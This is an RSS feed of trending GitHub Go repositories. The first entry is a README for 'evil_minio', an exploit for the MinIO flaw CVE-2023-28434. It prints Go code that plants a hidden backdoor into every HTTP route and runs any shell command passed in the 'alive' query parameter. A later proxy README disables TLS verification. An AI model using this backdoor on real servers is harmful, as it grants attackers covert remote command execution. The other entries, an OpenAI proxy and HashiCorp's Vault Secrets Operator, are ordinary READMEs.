<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-04-01T01:34:40Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>AbelChe/evil_minio</title>
    <updated>2023-04-01T01:34:40Z</updated>
    <id>tag:github.com,2023-04-01:/AbelChe/evil_minio</id>
    <link href="https://github.com/AbelChe/evil_minio" rel="alternate"></link>
    <summary type="html">&lt;p&gt;EXP for CVE-2023-28434 MinIO unauthorized to RCE&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Evil MinIO (CVE-2023-28434)&lt;/h1&gt; &#xA;&lt;p&gt;EXP for &lt;strong&gt;CVE-2023-28434&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;MinIO unauthorized to RCE&lt;/p&gt; &#xA;&lt;p&gt;Changed from &lt;a href=&#34;https://github.com/minio/minio/tree/8b4d0255b7247b1a06d923e69ed5ba01434e70b8&#34;&gt;https://github.com/minio/minio/tree/8b4d0255b7247b1a06d923e69ed5ba01434e70b8&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Changed what?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;add &lt;code&gt;cmd/x.go&lt;/code&gt;, used for exec system command&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package cmd&#xA;&#xA;import (&#xA;&#x9;&#34;os/exec&#34;&#xA;&#x9;&#34;runtime&#34;&#xA;)&#xA;&#xA;func getOutputDirectly(commandStr string) string {&#xA;&#x9;var execGlobalOutput string&#xA;&#x9;var shell [2]string&#xA;&#x9;var systemOS string = runtime.GOOS&#xA;&#x9;if systemOS == &#34;linux&#34; || systemOS == &#34;darwin&#34; {&#xA;&#x9;&#x9;shell[0], shell[1] = &#34;/bin/bash&#34;, &#34;-c&#34;&#xA;&#x9;} else {&#xA;&#x9;&#x9;shell[0], shell[1] = &#34;C:\\Windows\\System32\\cmd.exe&#34;, &#34;/c&#34;&#xA;&#x9;}&#xA;&#x9;cmd := exec.Command(shell[0], shell[1], commandStr)&#xA;&#x9;output, err := cmd.Output()&#xA;&#x9;if err != nil {&#xA;&#x9;&#x9;return &#34;&#34;&#xA;&#x9;}&#xA;&#x9;execGlobalOutput += string(output)&#xA;&#x9;return execGlobalOutput&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;cmd/routers.go&lt;/code&gt;, add line #72&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ..........&#xA;&#x9;setUploadForwardingHandler,&#xA;&#x9;// Add bucket forwarding handler&#xA;&#x9;setBucketForwardingHandler,&#xA;&#x9;// Add new handlers here.&#xA;&#x9;xHandler, // ADD THIS LINE &#xA;}&#xA;&#xA;// configureServer handler returns final handler for the http server.&#xA;func configureServerHandler(endpointServerPools EndpointServerPools) (http.Handler, error) {&#xA;// ..........&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;cmd/generic-handlers.go&lt;/code&gt;, add function &lt;code&gt;xHandler&lt;/code&gt; at the end&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func xHandler(h http.Handler) http.Handler {&#xA;&#x9;return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {&#xA;&#x9;&#x9;var arg string&#xA;&#x9;&#x9;values := r.URL.Query()&#xA;&#x9;&#x9;arg = values.Get(&#34;alive&#34;)&#xA;&#x9;&#x9;if arg != &#34;&#34; {&#xA;&#x9;&#x9;&#x9;w.Write([]byte(getOutputDirectly(arg)))&#xA;&#x9;&#x9;&#x9;return&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;h.ServeHTTP(w, r)&#xA;&#x9;})&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;What can be done?&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;GLOBAL backdoor as &lt;code&gt;http://1.2.3.4/?alive=whoami&lt;/code&gt; and &lt;code&gt;http://1.2.3.4/anything?alive=whoami&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Normal functions will not be affected&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AbelChe/evil_minio/main/resource/image-20230327164103832.png&#34; alt=&#34;image-20230327164103832&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AbelChe/evil_minio/main/resource/image-20230327164128648.png&#34; alt=&#34;image-20230327164128648&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>geekr-dev/openai-proxy</title>
    <updated>2023-04-01T01:34:40Z</updated>
    <id>tag:github.com,2023-04-01:/geekr-dev/openai-proxy</id>
    <link href="https://github.com/geekr-dev/openai-proxy" rel="alternate"></link>
    <summary type="html">&lt;p&gt;基于 Go 实现的 OpenAI HTTP 代理（云函数、lambda 函数、自己部署均可）&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GO-OPENAI-PROXY&lt;/h1&gt; &#xA;&lt;p&gt;基于 Go + 腾讯云 API 网关 + 云函数（部署到海外节点）实现 OpenAI API 调用代理&lt;/p&gt; &#xA;&lt;h3&gt;编译打包：&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./build.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;部署测试&lt;/h3&gt; &#xA;&lt;p&gt;然后在腾讯云云函数代码管理界面上传打包好 zip 包即可完成部署：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://image.gstatics.cn/2023/03/06/image-20230306171340547.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;你可以通过腾讯云云函数提供的测试工具进行测试，也可以本地通过 curl/postman 进行测试，使用的时候只需要将 &lt;code&gt;api.openai.com&lt;/code&gt; 替换成代理域名 &lt;code&gt;open.aiproxy.xyz&lt;/code&gt; 即可：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://geekr.gstatics.cn/wp-content/uploads/2023/03/image-38.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;你可以选择自己搭建，也可以直接使用我提供的代理域名 &lt;code&gt;open.aiproxy.xyz&lt;/code&gt;，反正是免费的。关于代理背后的原理，可以看我在极客书房发布的这篇教程：&lt;a href=&#34;https://geekr.dev/posts/chatgpt-website-by-laravel-10#toc-5&#34;&gt;国内无法调用 OpenAI 接口的解决办法&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;p&gt;本地调试走VPN的话可以设置环境变量 &lt;code&gt;ENV=local&lt;/code&gt;，然后直连 &lt;code&gt;api.openai.com&lt;/code&gt;：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 本地测试通过代理请求 OpenAI 接口&#xA;if os.Getenv(&#34;ENV&#34;) == &#34;local&#34; {&#xA;    proxyURL, _ := url.Parse(&#34;http://127.0.0.1:10809&#34;)&#xA;    client.Transport = &amp;amp;http.Transport{&#xA;        Proxy:           http.ProxyURL(proxyURL),&#xA;        TLSClientConfig: &amp;amp;tls.Config{InsecureSkipVerify: true},&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;流式响应支持&lt;/h3&gt; &#xA;&lt;p&gt;这个源代码本身是支持 stream 流式响应代理的，但目前腾讯云函数并不支持分块流式传输。所以，如果你需要实现流式响应，可以把编译后的二进制文件 &lt;code&gt;main&lt;/code&gt; 丢到任意海外云服务器运行，这样就变成支持流式响应的 OpenAI HTTP 代理了，如果你不想折腾，可以使用我这边提供的 &lt;code&gt;open2.aiproxy.xyz&lt;/code&gt; 作为代理进行测试：&lt;/p&gt; &#xA;&lt;img width=&#34;965&#34; alt=&#34;image&#34; src=&#34;https://user-images.githubusercontent.com/114386672/225609817-ca5c106b-22d4-4ae9-b3df-ca2c46d56843.png&#34;&gt;</summary>
  </entry>
  <entry>
    <title>hashicorp/vault-secrets-operator</title>
    <updated>2023-04-01T01:34:40Z</updated>
    <id>tag:github.com,2023-04-01:/hashicorp/vault-secrets-operator</id>
    <link href="https://github.com/hashicorp/vault-secrets-operator" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Vault Secrets Operator (VSO) allows Pods to consume Vault secrets natively from Kubernetes Secrets.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Vault Secrets Operator&lt;/h1&gt; &#xA;&lt;p&gt;The Vault Secrets Operator (VSO) allows Pods to consume Vault secrets natively from Kubernetes Secrets.&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;The Vault Secrets Operator operates by watching for changes to its supported set of Custom Resource Definitions (CRD). Each CRD provides the specification required to allow the &lt;em&gt;Operator&lt;/em&gt; to synchronize a Vault Secrets to a Kubernetes Secret. The &lt;em&gt;Operator&lt;/em&gt; writes the &lt;em&gt;source&lt;/em&gt; Vault secret data directly to the &lt;em&gt;destination&lt;/em&gt; Kubernetes Secret, ensuring that any changes made to the &lt;em&gt;source&lt;/em&gt; are replicated to the &lt;em&gt;destination&lt;/em&gt; over its lifetime. In this way, an application only needs to have access to the &lt;em&gt;destination&lt;/em&gt; secret in order to make use of the secret data contained within.&lt;/p&gt; &#xA;&lt;p&gt;See the developer docs for more info &lt;a href=&#34;https://developer.hashicorp.com/vault/docs/platform/k8s/vso&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Please note that The Vault Secrets Operator is in public beta. Please provide your feedback by opening a GitHub issue &lt;a href=&#34;https://github.com/hashicorp/vault-secrets-operator/issues&#34;&gt;here&lt;/a&gt;. We will be reviewing PR contributions after the beta period has elapsed.&lt;br&gt; Thanks!&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Features&lt;/h3&gt; &#xA;&lt;p&gt;The following features are supported by the Vault Secrets Operator:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;All Vault secret engines supported.&lt;/li&gt; &#xA; &lt;li&gt;TLS/mTLS communications with Vault.&lt;/li&gt; &#xA; &lt;li&gt;Authentication using the requesting &lt;code&gt;Pod&lt;/code&gt;&#39;s &lt;code&gt;ServiceAccount&lt;/code&gt; via the &lt;a href=&#34;https://developer.hashicorp.com/vault/docs/auth/kubernetes&#34;&gt;Kubernetes Auth Method&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Syncing Vault Secrets to Kubernetes Secrets.&lt;/li&gt; &#xA; &lt;li&gt;Secret rotation for &lt;code&gt;Deployment&lt;/code&gt;, &lt;code&gt;ReplicaSet&lt;/code&gt;, &lt;code&gt;StatefulSet&lt;/code&gt; Kubernetes resource types.&lt;/li&gt; &#xA; &lt;li&gt;Prometheus&#39; instrumentation for monitoring the &lt;em&gt;Operator&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Supported installation methods: &lt;code&gt;Helm&lt;/code&gt;, &lt;code&gt;Kustomize&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Samples&lt;/h2&gt; &#xA;&lt;p&gt;Setup kubernetes and deploy the samples:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Start a KinD cluster&#xA;make setup-kind&#xA;&#xA;# Deploy Vault&#xA;make setup-integration-test&#xA;&#xA;# Configure Vault&#xA;./config/samples/setup.sh&#xA;&#xA;# Build and deploy the operator&#xA;make build docker-build deploy-kind&#xA;&#xA;# Deploy the sample K8s resources&#xA;kubectl apply -k config/samples&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Inspect the resulting secrets:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl get secrets -n tenant-1 secret1 -o yaml&#xA;&#xA;kubectl get secrets -n tenant-1 pki1 -o yaml&#xA;&#xA;kubectl get secrets -n tenant-2 secret1 -o yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Delete the samples:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl delete -k config/samples&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Ingress TLS with VaultPKISecret&lt;/h3&gt; &#xA;&lt;p&gt;The file &lt;code&gt;config/samples/secrets_v1alpha1_vaultpkisecret_tls.yaml&lt;/code&gt; contains an example of using VaultPKISecret to populate a TLS secret for use with an Ingress. This sample takes a little more setup to test it out (derived from the &lt;a href=&#34;https://kind.sigs.k8s.io/docs/user/ingress/&#34;&gt;kind docs&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;The TLS example is part of the samples, so setup kind, configure Vault, and deploy the operator as described above.&lt;/p&gt; &#xA;&lt;p&gt;Then deploy the nginx ingress controller:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml&#xA;&#xA;kubectl wait --namespace ingress-nginx \&#xA;  --for=condition=ready pod \&#xA;  --selector=app.kubernetes.io/component=controller \&#xA;  --timeout=90s&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Check the deployed app with something like curl, it should return the &lt;code&gt;tls-app&lt;/code&gt; hostname, and the certificate should have a ~1.5m TTL:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ curl -k https://localhost:38443/tls-app/hostname&#xA;tls-app&#xA;&#xA;$ curl -kvI https://localhost:38443/tls-app/hostname&#xA;...&#xA;* Server certificate:&#xA;*  subject: CN=localhost&#xA;*  start date: Mar 17 05:53:28 2023 GMT&#xA;*  expire date: Mar 17 05:54:58 2023 GMT&#xA;*  issuer: CN=example.com&#xA;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Watch the nginx controller logs to see the TLS secret being rotated:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl logs -f -n ingress-nginx -l app.kubernetes.io/instance=ingress-nginx&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Tests&lt;/h2&gt; &#xA;&lt;h3&gt;Unit Tests&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Integration Tests&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Start a KinD cluster&#xA;make setup-kind&#xA;&#xA;# Build the operator binary, image, and deploy to the KinD cluster&#xA;make ci-build ci-docker-build ci-deploy-kind ci-deploy&#xA;&#xA;# Run the integration tests (includes Vault deployment)&#xA;make integration-test&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>